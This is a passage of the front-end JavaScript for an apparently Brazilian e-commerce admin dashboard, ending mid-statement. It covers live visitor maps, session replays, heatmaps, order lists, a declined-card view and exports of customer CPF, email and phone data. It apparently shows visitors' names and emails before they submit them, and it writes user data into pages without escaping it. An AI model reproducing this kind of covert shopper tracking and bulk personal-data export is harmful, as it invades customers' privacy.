document.addEventListener('DOMContentLoaded', () => {
  let transactions = [];
  let onlineLeads = [];
  let replaysList = [];
  let activeCardFilter = 'TODAS';
  let activePedidoFilter = 'TODOS';
  let searchQuery = '';
  let searchPedidosQuery = '';
  let currentView = 'dashboard';
  const revealedStates = {};
  
  // Replay Player States
  let replayEvents = [];
  let playbackInterval = null;
  let playbackIndex = 0;
  let isPlaying = false;

  // Leaflet Map State
  let liveMap = null;
  let mapMarkers = [];

  // ApexCharts Instances
  let channelsChart = null;
  let devicesChart = null;
  let geoChart = null;
  let osChart = null;

  // ===========================================================
  // DOM References & Views Routing
  // ===========================================================
  const views = {
    dashboard: document.getElementById('view-dashboard'),
    mapa: document.getElementById('view-mapa'),
    trafego: document.getElementById('view-trafego'),
    replays: document.getElementById('view-replays'),
    heatmaps: document.getElementById('view-heatmaps'),
    pedidos: document.getElementById('view-pedidos'),
    cartoes: document.getElementById('view-declined-cards'),
    financeiro: document.getElementById('view-financeiro'),
    auditoria: document.getElementById('view-auditoria'),
    gateway: document.getElementById('view-gateway'),
  };

  const navBtns = {
    dashboard: document.getElementById('nav-dashboard'),
    mapa: document.getElementById('nav-mapa'),
    trafego: document.getElementById('nav-trafego'),
    replays: document.getElementById('nav-replays'),
    heatmaps: document.getElementById('nav-heatmaps'),
    pedidos: document.getElementById('nav-pedidos'),
    cartoes: document.getElementById('nav-cartoes'),
    financeiro: document.getElementById('nav-financeiro'),
    auditoria: document.getElementById('nav-auditoria'),
    gateway: document.getElementById('nav-gateway'),
  };

  const mobTabs = {
    dashboard: document.getElementById('mob-tab-dashboard'),
    mapa: document.getElementById('mob-tab-mapa'),
    trafego: document.getElementById('mob-tab-trafego'),
    replays: document.getElementById('mob-tab-replays'),
    heatmaps: document.getElementById('mob-tab-heatmaps'),
    pedidos: document.getElementById('mob-tab-pedidos'),
    cartoes: document.getElementById('mob-tab-cartoes'),
    financeiro: document.getElementById('mob-tab-financeiro'),
    auditoria: document.getElementById('mob-tab-auditoria'),
    gateway: document.getElementById('nav-gateway'), // fallback
  };

  // Nav badges
  const sidebarNegadoBadge = document.getElementById('sidebar-negado-badge');
  const sidebarPedidosCount = document.getElementById('sidebar-pedidos-count');

  // Stats KPIs
  const kpiVisitors = document.getElementById('kpi-visitors');
  const kpiConversion = document.getElementById('kpi-conversion');
  const kpiAvgTime = document.getElementById('kpi-avg-time');
  const kpiBounceRate = document.getElementById('kpi-bounce-rate');

  // Stage funnels
  const funnelHome = document.getElementById('funnel-home');
  const barFunnelHome = document.getElementById('bar-funnel-home');
  const funnelCheckout = document.getElementById('funnel-checkout');
  const pctFunnelCheckout = document.getElementById('pct-funnel-checkout');
  const barFunnelCheckout = document.getElementById('bar-funnel-checkout');
  const funnelPayment = document.getElementById('funnel-payment');
  const pctFunnelPayment = document.getElementById('pct-funnel-payment');
  const barFunnelPayment = document.getElementById('bar-funnel-payment');
  const funnelSuccess = document.getElementById('funnel-success');
  const pctFunnelSuccess = document.getElementById('pct-funnel-success');
  const barFunnelSuccess = document.getElementById('bar-funnel-success');

  // Lists
  const dashOnlineLeadsList = document.getElementById('dash-online-leads-list');
  const dashLastOrdersList = document.getElementById('dash-last-orders-list');
  const pedidosContainer = document.getElementById('pedidos-list-container');
  const pedidosEmptyState = document.getElementById('pedidos-empty-state');
  const searchPedidos = document.getElementById('search-pedidos');

  // Cards recused
  const container = document.getElementById('transaction-list-container');
  const loadingState = document.getElementById('loading-state');
  const emptyState = document.getElementById('empty-state');
  const statAttempts = document.getElementById('stat-attempts');
  const statToday = document.getElementById('stat-today');
  const statTotalValue = document.getElementById('stat-total-value');
  const filterCountAll = document.getElementById('filter-count-all');
  const filterCountMaster = document.getElementById('filter-count-master');
  const filterCountVisa = document.getElementById('filter-count-visa');
  const searchInput = document.getElementById('search-input');

  // Detailed online views
  const onlineBigCount = document.getElementById('online-count-dash');
  const onlineOrdersToday = document.getElementById('online-orders-today');
  const activityList = document.getElementById('activity-list');

  // Switch Theme & Roles
  const themeToggle = document.getElementById('theme-toggle');
  const roleDisplay = document.getElementById('role-display');

  // ===========================================================
  // Auth Controls
  // ===========================================================
  async function checkAuth() {
    try {
      const res = await fetch('/api/auth/status');
      const data = await res.json();
      if (!data.authenticated) {
        window.location.href = 'login.html';
        return;
      }
      // Set role display
      roleDisplay.textContent = `Função: ${data.role.toUpperCase()}`;
      
      // Restricted views for Operator
      if (data.role === 'operator') {
        if (navBtns.auditoria) navBtns.auditoria.style.display = 'none';
      }
    } catch (err) {
      window.location.href = 'login.html';
    }
  }

  const handleLogout = async () => {
    await fetch('/api/logout', { method: 'POST' });
    window.location.href = 'login.html';
  };
  document.getElementById('btn-logout').addEventListener('click', handleLogout);
  document.getElementById('btn-logout-mobile').addEventListener('click', handleLogout);

  // ===========================================================
  // Routing Views
  // ===========================================================
  function showView(name) {
    Object.keys(views).forEach(k => {
      if (views[k]) views[k].classList.toggle('hidden', k !== name);
      if (navBtns[k]) navBtns[k].classList.toggle('active', k === name);
      if (mobTabs[k]) mobTabs[k].classList.toggle('active', k === name);
    });
    
    currentView = name;

    // View specific instantiations
    if (name === 'mapa') {
      initLiveMap();
    } else if (name === 'trafego') {
      loadTrafficCharts();
    } else if (name === 'replays') {
      loadReplaySessions();
    } else if (name === 'heatmaps') {
      loadHeatmaps();
    } else if (name === 'financeiro') {
      loadFinanceDashboard();
    } else if (name === 'auditoria') {
      loadAuditLogs();
    }
  }

  Object.keys(navBtns).forEach(k => {
    if (navBtns[k]) navBtns[k].addEventListener('click', () => showView(k));
  });
  Object.keys(mobTabs).forEach(k => {
    if (mobTabs[k]) mobTabs[k].addEventListener('click', () => showView(k));
  });

  if (document.getElementById('btn-see-all-orders')) {
    document.getElementById('btn-see-all-orders').addEventListener('click', () => showView('pedidos'));
  }
  if (document.getElementById('btn-go-to-online')) {
    document.getElementById('btn-go-to-online').addEventListener('click', () => showView('online'));
  }
  if (document.getElementById('btn-go-to-orders')) {
    document.getElementById('btn-go-to-orders').addEventListener('click', () => showView('pedidos'));
  }

  // ===========================================================
  // Light/Dark Theme Switcher
  // ===========================================================
  themeToggle.addEventListener('change', () => {
    if (themeToggle.checked) {
      document.body.classList.add('dark-theme');
      document.body.classList.remove('light-theme');
    } else {
      document.body.classList.remove('dark-theme');
      document.body.classList.add('light-theme');
    }
    // Re-render map tiles to fit active theme
    if (liveMap) {
      liveMap.remove();
      liveMap = null;
      initLiveMap();
    }
  });

  // ===========================================================
  // Helpers
  // ===========================================================
  const currency = (val) => new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(val);

  // ===========================================================
  // 1. Dashboard: Load Real-time Stats & Funnel
  // ===========================================================
  async function loadData() {
    try {
      const [statsRes, txRes, onlineRes, trafficRes] = await Promise.all([
        fetch('/api/stats'),
        fetch('/api/transactions'),
        fetch('/api/online-leads'),
        fetch('/api/analytics/traffic')
      ]);

      if (statsRes.status === 401 || txRes.status === 401) {
        window.location.href = 'login.html';
        return;
      }

      const stats = await statsRes.json();
      transactions = await txRes.json();
      onlineLeads = await onlineRes.json();
      const traffic = await trafficRes.json();

      updateKPIs(traffic, stats);
      updateFunnels(onlineLeads, stats);
      updateSidebar();
      renderDashboardLists();
      renderPedidosList();
      renderDeclinedCardsList();
      updateOnlineView();

      // Trigger map updates if open
      if (currentView === 'mapa' && liveMap) {
        updateMapMarkers();
      }
    } catch (err) {
      console.error('Erro ao carregar dados do Dashboard:', err);
    }
  }

  function updateKPIs(traffic, stats) {
    kpiVisitors.textContent = traffic.totalVisitors || 0;
    
    const approved = stats.totalAprovados || 0;
    const total = stats.totalAttempts || 0;
    const convRate = total > 0 ? ((approved / total) * 100).toFixed(1) : '0.0';
    kpiConversion.textContent = `${convRate}%`;

    kpiAvgTime.textContent = `${traffic.avgTimeOnSite || 0}s`;
    kpiBounceRate.textContent = `${traffic.bounceRate || 0}%`;

    // Today's revenue
    const revenue = stats.totalReceita || 0;
    const todayCount = stats.todayAttempts || 0;
    if (document.getElementById('dash-faturamento-hoje')) {
      document.getElementById('dash-faturamento-hoje').textContent = currency(revenue);
    }
    if (document.getElementById('dash-pedidos-hoje-label')) {
      document.getElementById('dash-pedidos-hoje-label').textContent = `${todayCount} pedidos hoje`;
    }
    if (document.getElementById('dash-receita-total')) {
      document.getElementById('dash-receita-total').textContent = currency(revenue);
    }
    if (document.getElementById('dash-aguardando-pagamento')) {
      document.getElementById('dash-aguardando-pagamento').textContent = currency(stats.totalAguardandoPagamento || 0);
    }
    if (document.getElementById('dash-ticket-medio')) {
      const avg = total > 0 ? stats.totalAttemptedValue / total : 0;
      document.getElementById('dash-ticket-medio').textContent = currency(avg);
    }
    if (document.getElementById('dash-conversao-rate')) {
      document.getElementById('dash-conversao-rate').textContent = `${convRate}%`;
    }
  }

  function updateFunnels(online, stats) {
    // Stage counts from active online visitors + completed leads stats
    const totalLeads = stats.totalAttempts || 0;
    const pendingVal = stats.totalPixCopied || 0;
    const approvedVal = stats.totalAprovados || 0;
    const cardVal = stats.totalCardAttempts || 0;

    funnelHome.textContent = totalLeads;
    barFunnelHome.style.width = totalLeads > 0 ? '100%' : '0%';

    funnelCheckout.textContent = pendingVal;
    pctFunnelCheckout.textContent = `${pct(pendingVal, totalLeads)}%`;
    barFunnelCheckout.style.width = `${pct(pendingVal, totalLeads)}%`;

    funnelPayment.textContent = cardVal;
    pctFunnelPayment.textContent = `${pct(cardVal, totalLeads)}%`;
    barFunnelPayment.style.width = `${pct(cardVal, totalLeads)}%`;

    funnelSuccess.textContent = approvedVal;
    pctFunnelSuccess.textContent = `${pct(approvedVal, totalLeads)}%`;
    barFunnelSuccess.style.width = `${pct(approvedVal, totalLeads)}%`;

    if (document.getElementById('dash-funil-total-label')) {
      document.getElementById('dash-funil-total-label').textContent = `total ${totalLeads}`;
    }
  }

  function pct(part, total) {
    return total > 0 ? Math.round((part / total) * 100) : 0;
  }

  function updateSidebar() {
    const total = transactions.length;
    const negados = transactions.filter(t => t.brand !== 'PIX').length;
    if (sidebarPedidosCount) sidebarPedidosCount.textContent = total;
    if (sidebarNegadoBadge) sidebarNegadoBadge.textContent = negados;
  }

  function renderDashboardLists() {
    // Recent orders
    dashLastOrdersList.innerHTML = '';
    const recent = transactions.slice(0, 5);
    if (recent.length === 0) {
      dashLastOrdersList.innerHTML = '<li class="dash-list-item"><div class="dash-item-details"><p class="dash-item-title text-muted">Sem pedidos.</p></div></li>';
    } else {
      recent.forEach(tx => {
        const li = document.createElement('li');
        li.className = 'dash-list-item';
        const statusClass = tx.status === 'PAGO' ? 'status-pago' : tx.status === 'PENDENTE' ? 'badge-pending' : 'status-negado';
        const statusIcon = tx.status === 'PAGO' ? 'fa-circle-check' : tx.status === 'PENDENTE' ? 'fa-clock' : 'fa-circle-exclamation';
        li.innerHTML = `
          <span class="dash-item-badge ${statusClass}"><i class="fa-solid ${statusIcon}"></i> ${tx.status}</span>
          <div class="dash-item-details">
            <p class="dash-item-title">${tx.client.name}</p>
            <p class="dash-item-subtitle">${tx.brand} · ${tx.date.split(',')[0]}</p>
          </div>
          <span class="dash-item-price">${currency(tx.amount)}</span>
        `;
        dashLastOrdersList.appendChild(li);
      });
    }

    // Active leads list
    dashOnlineLeadsList.innerHTML = '';
    const activeListItems = onlineLeads.slice(0, 4);
    if (activeListItems.length === 0) {
      dashOnlineLeadsList.innerHTML = '<li class="dash-list-item"><div class="dash-item-details"><p class="dash-item-title text-muted">Nenhum visitante ativo.</p></div></li>';
    } else {
      activeListItems.forEach(lead => {
        const li = document.createElement('li');
        li.className = 'dash-list-item';
        let stepClass = 'badge-pending';
        if (lead.status_etapa === 'Pagamento' || lead.status_etapa === 'Obrigado') stepClass = 'status-pago';
        else if (lead.status_etapa === 'Identificação') stepClass = 'other';
        
        const devIcon = lead.dispositivo === 'Mobile' ? 'fa-mobile-screen' : 'fa-desktop';
        const name = lead.nome || 'Visitante Anônimo';
        
        li.innerHTML = `
          <span class="dash-item-badge ${stepClass}">${lead.status_etapa || 'Loja'}</span>
          <div class="dash-item-details">
            <p class="dash-item-title">${name}</p>
            <p class="dash-item-subtitle" style="font-size:10px;">${lead.email || 'Aguardando digitação'}</p>
          </div>
          <span class="dash-item-price" style="opacity:0.7;"><i class="fa-solid ${devIcon}"></i></span>
        `;
        dashOnlineLeadsList.appendChild(li);
      });
    }
  }

  // ===========================================================
  // 2. Real-time Map (Leaflet)
  // ===========================================================
  function initLiveMap() {
    if (liveMap) return; // Already loaded

    // Center on Brazil region
    liveMap = L.map('live-map').setView([-14.235, -51.9253], 4);
    
    // Choose tile styling according to body theme (dark/light filter)
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      maxZoom: 18,
      attribution: '© OpenStreetMap contributors'
    }).addTo(liveMap);

    updateMapMarkers();
  }

  function updateMapMarkers() {
    if (!liveMap) return;

    // Clear old markers
    mapMarkers.forEach(m => liveMap.removeLayer(m));
    mapMarkers = [];

    // Map Brazil state/city offsets to mock random coordinates if geo is local fallback
    const stateCoords = {
      'São Paulo': [-23.5505, -46.6333],
      'Rio de Janeiro': [-22.9068, -43.1729],
      'Minas Gerais': [-19.9167, -43.9345],
      'Rio Grande do Sul': [-30.0346, -51.2177],
      'Paraná': [-25.4284, -49.2733],
      'Santa Catarina': [-27.5954, -48.5480],
      'Bahia': [-12.9704, -38.5124]
    };

    onlineLeads.forEach(lead => {
      let lat = -23.5505;
      let lng = -46.6333;

      // Add a slight random jitter so markers do not overlay directly on top of each other
      const jitterLat = (Math.random() - 0.5) * 1.5;
      const jitterLng = (Math.random() - 0.5) * 1.5;

      const stateName = lead.estado || 'São Paulo';
      if (stateCoords[stateName]) {
        lat = stateCoords[stateName][0] + jitterLat;
        lng = stateCoords[stateName][1] + jitterLng;
      } else {
        lat = lat + jitterLat;
        lng = lng + jitterLng;
      }

      const name = lead.nome || 'Visitante';
      const stage = lead.status_etapa || 'Loja';
      const dev = lead.dispositivo || 'Mobile';

      const popupContent = `
        <div style="font-family:'Outfit'; font-size:12px;">
          <strong style="color:var(--primary); font-size:13px;">${name}</strong><br>
          <b>Etapa:</b> ${stage}<br>
          <b>Aparelho:</b> ${dev}<br>
          <b>Local:</b> ${lead.cidade || 'Simulado'}, ${lead.estado || 'SP'}
        </div>
      `;

      // Custom pulsing green icon for active users
      const customIcon = L.divIcon({
        className: 'map-pulse-marker',
        html: '<div style="width:12px; height:12px; background:#10b981; border-radius:50%; border:2px solid #fff; box-shadow:0 0 10px #10b981;"></div>',
        iconSize: [12, 12]
      });

      const marker = L.marker([lat, lng], { icon: customIcon })
        .bindPopup(popupContent)
        .addTo(liveMap);

      mapMarkers.push(marker);
    });
  }

  // ===========================================================
  // 3. Traffic & UTM Channels (ApexCharts)
  // ===========================================================
  async function loadTrafficCharts() {
    try {
      const [trafficRes, devicesRes, geoRes] = await Promise.all([
        fetch('/api/analytics/traffic'),
        fetch('/api/analytics/devices'),
        fetch('/api/analytics/geo')
      ]);

      const traffic = await trafficRes.json();
      const devices = await devicesRes.json();
      const geo = await geoRes.json();

      renderChannelsChart(traffic.trafficSources);
      renderDevicesChart(devices.devices);
      renderStatesChart(geo.states);
      renderOSChart(devices.os);
    } catch (e) {
      console.error('Erro ao renderizar gráficos:', e);
    }
  }

  function renderChannelsChart(sources = {}) {
    const labels = Object.keys(sources);
    const series = Object.values(sources);

    if (channelsChart) {
      channelsChart.updateSeries(series);
      return;
    }

    const options = {
      chart: { type: 'donut', height: 260, foreColor: '#9ca3af' },
      series: series,
      labels: labels,
      theme: { mode: document.body.classList.contains('dark-theme') ? 'dark' : 'light' },
      colors: ['#a855f7', '#ec4899', '#f59e0b', '#3b82f6', '#10b981'],
      legend: { position: 'bottom' }
    };

    channelsChart = new ApexCharts(document.getElementById('chart-traffic-channels'), options);
    channelsChart.render();
  }

  function renderDevicesChart(devs = {}) {
    const labels = Object.keys(devs);
    const series = Object.values(devs);

    if (devicesChart) {
      devicesChart.updateSeries(series);
      return;
    }

    const options = {
      chart: { type: 'pie', height: 260, foreColor: '#9ca3af' },
      series: series,
      labels: labels,
      theme: { mode: document.body.classList.contains('dark-theme') ? 'dark' : 'light' },
      colors: ['#ec4899', '#3b82f6', '#f59e0b'],
      legend: { position: 'bottom' }
    };

    devicesChart = new ApexCharts(document.getElementById('chart-traffic-devices'), options);
    devicesChart.render();
  }

  function renderStatesChart(states = {}) {
    const labels = Object.keys(states);
    const series = Object.values(states);

    if (geoChart) {
      geoChart.updateSeries([{ data: series }]);
      return;
    }

    const options = {
      chart: { type: 'bar', height: 260, foreColor: '#9ca3af', toolbar: { show: false } },
      series: [{ name: 'Acessos', data: series }],
      xaxis: { categories: labels },
      theme: { mode: document.body.classList.contains('dark-theme') ? 'dark' : 'light' },
      colors: ['#a855f7'],
      plotOptions: { bar: { borderRadius: 4, columnWidth: '45%' } }
    };

    geoChart = new ApexCharts(document.getElementById('chart-traffic-geo-states'), options);
    geoChart.render();
  }

  function renderOSChart(os = {}) {
    const labels = Object.keys(os);
    const series = Object.values(os);

    if (osChart) {
      osChart.updateSeries([{ data: series }]);
      return;
    }

    const options = {
      chart: { type: 'bar', height: 260, foreColor: '#9ca3af', toolbar: { show: false } },
      series: [{ name: 'Sistemas', data: series }],
      xaxis: { categories: labels },
      theme: { mode: document.body.classList.contains('dark-theme') ? 'dark' : 'light' },
      colors: ['#ec4899'],
      plotOptions: { bar: { horizontal: true, borderRadius: 4, barHeight: '50%' } }
    };

    osChart = new ApexCharts(document.getElementById('chart-traffic-os'), options);
    osChart.render();
  }

  // ===========================================================
  // 4. Session Replays Player simulator
  // ===========================================================
  async function loadReplaySessions() {
    const replaysContainer = document.getElementById('replays-sessions-container');
    replaysContainer.innerHTML = '<li class="loading-state"><i class="fa-solid fa-circle-notch fa-spin"></i></li>';

    try {
      const response = await fetch('/api/replays');
      replaysList = await response.json();
      replaysContainer.innerHTML = '';

      if (replaysList.length === 0) {
        replaysContainer.innerHTML = '<li class="dash-list-item"><p class="text-muted">Nenhum replay encontrado.</p></li>';
        return;
      }

      replaysList.forEach(rep => {
        const li = document.createElement('li');
        li.className = 'dash-list-item';
        li.style.cursor = 'pointer';
        li.innerHTML = `
          <div class="dash-item-details">
            <p class="dash-item-title">Origem: ${rep.origem_trafego} (${rep.cidade || 'SP'})</p>
            <p class="dash-item-subtitle">Dispositivo: ${rep.dispositivo} · ${rep.navegador} · SO: ${rep.so}</p>
            <p class="dash-item-subtitle" style="font-size:10px; color:var(--primary);">Duração: ${rep.duracao_segundos}s</p>
          </div>
          <span class="dash-item-price"><i class="fa-regular fa-circle-play" style="font-size:18px; color:var(--primary);"></i></span>
        `;

        li.addEventListener('click', () => selectSessionForReplay(rep.session_id));
        replaysContainer.appendChild(li);
      });
    } catch (e) {
      replaysContainer.innerHTML = '<li class="dash-list-item"><p class="text-danger">Erro ao carregar sessões.</p></li>';
    }
  }

  async function selectSessionForReplay(sessionId) {
    // Reset player states
    if (playbackInterval) clearInterval(playbackInterval);
    isPlaying = false;
    playbackIndex = 0;

    const playBtn = document.getElementById('btn-play-replay');
    const pauseBtn = document.getElementById('btn-pause-replay');
    const playerSessionDisplay = document.getElementById('player-session-id');

    playerSessionDisplay.textContent = `Sessão: ${sessionId.substring(0, 12)}...`;
    playBtn.disabled = true;
    pauseBtn.disabled = true;

    try {
      const res = await fetch(`/api/replays?id=${sessionId}`);
      replayEvents = await res.json();

      if (replayEvents.length === 0) {
        alert('Esta gravação não contém movimentos suficientes.');
        return;
      }

      // Sort events by timeline timestamp
      replayEvents.sort((a, b) => a.time - b.time);
      playBtn.disabled = false;

      // Event listener for play trigger
      playBtn.onclick = () => startPlayback();
      pauseBtn.onclick = () => pausePlayback();

    } catch (e) {
      console.error(e);
      alert('Erro ao carregar dados do replay.');
    }
  }

  function startPlayback() {
    if (isPlaying) return;
    isPlaying = true;
    
    document.getElementById('btn-play-replay').disabled = true;
    document.getElementById('btn-pause-replay').disabled = false;

    const cursor = document.getElementById('virtual-cursor');
    const container = document.getElementById('replay-player-canvas');
    const containerWidth = container.clientWidth;
    const containerHeight = container.clientHeight;

    const timeLabel = document.getElementById('player-time-label');

    playbackInterval = setInterval(() => {
      if (playbackIndex >= replayEvents.length) {
        // Timeline completed
        clearInterval(playbackInterval);
        isPlaying = false;
        document.getElementById('btn-play-replay').disabled = false;
        document.getElementById('btn-pause-replay').disabled = true;
        playbackIndex = 0;
        return;
      }

      const event = replayEvents[playbackIndex];
      
      // Update timer label
      const sec = Math.floor(event.time / 1000);
      const min = Math.floor(sec / 60);
      timeLabel.textContent = `${min.toString().padStart(2, '0')}:${(sec % 60).toString().padStart(2, '0')}`;

      if (event.type === 'move') {
        // Map cursor coordinate bounds onto player canvas box
        const x = Math.min(containerWidth - 14, Math.max(0, event.x));
        const y = Math.min(containerHeight - 14, Math.max(0, event.y));
        cursor.style.left = `${x}px`;
        cursor.style.top = `${y}px`;
      } else if (event.type === 'click') {
        // Add click flash overlay animation
        cursor.style.transform = 'scale(2)';
        setTimeout(() => cursor.style.transform = 'scale(1)', 150);
      } else if (event.type === 'scroll') {
        // Mock scroll replication
        const mockScreen = document.getElementById('replay-screen-mock');
        mockScreen.style.transform = `translateY(-${Math.min(200, event.scrollY / 4)}px)`;
      }

      playbackIndex++;
    }, 180); // Playback step intervals
  }

  function pausePlayback() {
    if (playbackInterval) clearInterval(playbackInterval);
    isPlaying = false;
    document.getElementById('btn-play-replay').disabled = false;
    document.getElementById('btn-pause-replay').disabled = true;
  }

  // ===========================================================
  // 5. Click Heatmap (Heatmap.js)
  // ===========================================================
  let heatmapInstance = null;
  const heatmapSelect = document.getElementById('heatmap-url-select');

  heatmapSelect.addEventListener('change', () => loadHeatmaps());

  async function loadHeatmaps() {
    const activeUrl = heatmapSelect.value;
    const heatmapBox = document.getElementById('heatmap-container');

    // Reset heatmap DOM overlay canvas
    const oldCanvas = heatmapBox.querySelector('canvas');
    if (oldCanvas) oldCanvas.remove();

    // Create heatmap.js instance wrapper
    heatmapInstance = h337.create({
      container: heatmapBox,
      radius: 35,
      maxOpacity: 0.7,
      minOpacity: 0.05,
      blur: 0.85
    });

    try {
      const res = await fetch(`/api/heatmaps?page_url=${activeUrl}`);
      const clickCoords = await res.json();

      const boxWidth = heatmapBox.clientWidth;
      const boxHeight = heatmapBox.clientHeight;

      const dataPoints = clickCoords.map(c => {
        // Resolve click percent values to relative box coordinates
        const x = Math.round((parseFloat(c.x_pct) / 100) * boxWidth);
        const y = Math.round(c.y_px % boxHeight); // loop values into container height bounds
        return { x, y, value: 8 };
      });

      heatmapInstance.setData({
        max: 20,
        min: 0,
        data: dataPoints
      });
    } catch (err) {
      console.error(err);
    }
  }

  // ===========================================================
  // 6. Financial Dashboard
  // ===========================================================
  async function loadFinanceDashboard() {
    try {
      const res = await fetch('/api/analytics/finance');
      const finance = await res.json();

      document.getElementById('fin-revenue').textContent = currency(finance.revenue);
      document.getElementById('fin-profit').textContent = currency(finance.profit);
      document.getElementById('fin-ticket').textContent = currency(finance.ticketMedio);
      document.getElementById('fin-roi').textContent = finance.roi;

      document.getElementById('fin-qty-approved').textContent = finance.quantityApproved;
      document.getElementById('fin-qty-pending').textContent = finance.quantityPending;
      document.getElementById('fin-val-pending').textContent = currency(finance.valuePending);
      document.getElementById('fin-qty-declined').textContent = finance.quantityDeclined;
      document.getElementById('fin-val-declined').textContent = currency(finance.valueDeclined);
    } catch (e) {
      console.error(e);
    }
  }

  // ===========================================================
  // 7. Security Audit Log Viewer
  // ===========================================================
  async function loadAuditLogs() {
    const body = document.getElementById('audit-logs-body');
    body.innerHTML = '<tr><td colspan="4" style="text-align:center; padding:20px;"><i class="fa-solid fa-circle-notch fa-spin"></i></td></tr>';

    try {
      const res = await fetch('/api/audit-logs');
      
      if (res.status === 403) {
        body.innerHTML = '<tr><td colspan="4" style="text-align:center; color:var(--danger); padding:20px;">Apenas administradores podem ver logs de auditoria.</td></tr>';
        return;
      }

      const logs = await res.json();
      body.innerHTML = '';

      if (logs.length === 0) {
        body.innerHTML = '<tr><td colspan="4" style="text-align:center; padding:20px;">Nenhum log encontrado.</td></tr>';
        return;
      }

      logs.forEach(l => {
        const tr = document.createElement('tr');
        tr.style.borderBottom = '1px solid var(--border-subtle)';
        
        const dateStr = new Date(l.created_at || l.timestamp).toLocaleString('pt-BR');
        
        tr.innerHTML = `
          <td style="padding:12px; color:var(--text-muted);">${dateStr}</td>
          <td style="padding:12px; font-weight:600;">${l.admin_user || l.user}</td>
          <td style="padding:12px;">${l.action}</td>
          <td style="padding:12px; font-family:monospace; color:var(--text-dark);">${l.ip}</td>
        `;
        body.appendChild(tr);
      });
    } catch (e) {
      body.innerHTML = '<tr><td colspan="4" style="text-align:center; color:var(--danger); padding:20px;">Erro ao carregar logs.</td></tr>';
    }
  }

  // ===========================================================
  // 8. Excel, CSV, and PDF Exports (SheetJS & jsPDF)
  // ===========================================================
  document.getElementById('btn-export-excel').addEventListener('click', () => {
    if (transactions.length === 0) return alert('Nenhum pedido para exportar.');
    
    // Flat JSON to Excel rows mapping
    const rows = transactions.map(t => ({
      ID: t.id,
      Data: t.date,
      Valor: t.amount,
      Status: t.status,
      Cliente: t.client.name,
      Email: t.client.email,
      CPF: t.client.cpf,
      Telefone: t.client.phone,
      Cidade: t.address.city,
      Estado: t.address.state
    }));

    const ws = XLSX.utils.json_to_sheet(rows);
    const wb = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(wb, ws, "Pedidos Aprovados");
    XLSX.writeFile(wb, "SaaS_Relatorio_Vendas.xlsx");
  });

  document.getElementById('btn-export-csv').addEventListener('click', () => {
    if (transactions.length === 0) return alert('Nenhum pedido para exportar.');
    
    const headers = ['ID', 'Data', 'Valor', 'Status', 'Cliente', 'Email', 'CPF', 'Telefone', 'Cidade', 'Estado'];
    const csvRows = [headers.join(',')];

    transactions.forEach(t => {
      const row = [
        t.id,
        t.date,
        t.amount,
        t.status,
        `"${t.client.name}"`,
        t.client.email,
        t.client.cpf,
        t.client.phone,
        `"${t.address.city}"`,
        t.address.state
      ];
      csvRows.push(row.join(','));
    });

    const csvContent = "data:text/csv;charset=utf-8,\uFEFF" + csvRows.join("\n");
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", "SaaS_Relatorio_Vendas.csv");
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  });

  document.getElementById('btn-export-pdf').addEventListener('click', () => {
    if (transactions.length === 0) return alert('Nenhum pedido para exportar.');

    const { jsPDF } = window.jspdf;
    const doc = new jsPDF();

    doc.setFont("Outfit", "bold");
    doc.setFontSize(20);
    doc.text("SaaS Boss Analytics - Relatório de Pedidos", 14, 20);

    doc.setFontSize(10);
    doc.setFont("Outfit", "normal");
    doc.text(`Gerado em: ${new Date().toLocaleString()}`, 14, 28);
    doc.line(14, 32, 196, 32);

    let y = 40;
    doc.setFont("Outfit", "bold");
    doc.text("Cliente", 14, y);
    doc.text("Data", 80, y);
    doc.text("Status", 130, y);
    doc.text("Valor", 170, y);

    y += 8;
    doc.setFont("Outfit", "normal");

    transactions.slice(0, 20).forEach(t => { // limit to 20 to fit single page preview
      doc.text(t.client.name.substring(0, 28), 14, y);
      doc.text(t.date.split(',')[0], 80, y);
      doc.text(t.status, 130, y);
      doc.text(currency(t.amount), 170, y);
      y += 8;
    });

    doc.save("SaaS_Relatorio_Financeiro.pdf");
  });

  // ===========================================================
  // Standard Operations Rendering (Orders & Cards)
  // ===========================================================
  function renderPedidosList() {
    const allTx = transactions;
    const pixTx = transactions.filter(t => t.brand === 'PIX' && t.status !== 'PAGO');
    const pagoTx = transactions.filter(t => t.status === 'PAGO');
    const negadoTx = transactions.filter(t => t.status === 'NEGADO');

    document.getElementById('fpedido-count-all').textContent = allTx.length;
    document.getElementById('fpedido-count-pix').textContent = pixTx.length;
    document.getElementById('fpedido-count-pago').textContent = pagoTx.length;
    document.getElementById('fpedido-count-negado').textContent = negadoTx.length;

    // Remove old items
    pedidosContainer.querySelectorAll('.pedido-item').forEach(el => el.remove());

    let filtered = transactions.filter(t => {
      if (activePedidoFilter === 'PIX') return t.brand === 'PIX' && t.status !== 'PAGO';
      if (activePedidoFilter === 'PAGO') return t.status === 'PAGO';
      if (activePedidoFilter === 'NEGADO') return t.status === 'NEGADO';
      return true;
    }).filter(t => {
      if (!searchPedidosQuery) return true;
      const q = searchPedidosQuery.toLowerCase();
      return (t.client.name && t.client.name.toLowerCase().includes(q)) || 
             (t.client.email && t.client.email.toLowerCase().includes(q));
    });

    if (filtered.length === 0) {
      pedidosEmptyState.classList.remove('hidden');
      return;
    }
    pedidosEmptyState.classList.add('hidden');

    filtered.forEach(tx => {
      const el = document.createElement('div');
      el.className = 'pedido-item';
      el.id = `pedido-${tx.id}`;

      const statusClass = tx.status === 'PAGO' ? 'status-pago' : tx.status === 'PENDENTE' ? 'badge-pending' : 'status-negado';
      const statusIcon = tx.status === 'PAGO' ? 'fa-circle-check' : tx.status === 'PENDENTE' ? 'fa-clock' : 'fa-circle-exclamation';
      
      // Inline Original SVG PIX
      const brandIcon = tx.brand === 'PIX' 
